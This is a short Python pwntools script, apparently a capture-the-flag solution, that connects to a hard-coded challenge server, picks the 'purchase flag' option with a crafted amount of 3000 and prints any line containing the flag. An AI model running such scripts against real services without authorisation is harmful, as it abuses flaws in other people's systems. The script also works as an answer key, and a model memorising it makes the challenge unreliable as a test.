from pwn import *

# Connect to the remote server
host = '140.113.24.241'
port = 30170

# Start the connection
conn = remote(host, port)

# Receive the initial welcome message
conn.recvuntil(b"Input your choice:")

# Send choice to purchase flag
conn.sendline(b"1")

# Receive prompt for amount
conn.recvuntil(b"Input the amount:")

# Send the calculated amount
conn.sendline(b"3000")

# Receive the response from the server
while True:
    response = conn.recv(1024)  # receive 1024 bytes
    if not response:
        break  # if no more data, break the loop

    response = response.decode()
    lines = response.splitlines()

    for line in lines:
        if "FLAG" in line:
            print(line)
            break
    else:
        continue  # executed if the loop ended normally (no break)
    break  # executed if 'continue' was skipped (break)

# Close the connection
conn.close()
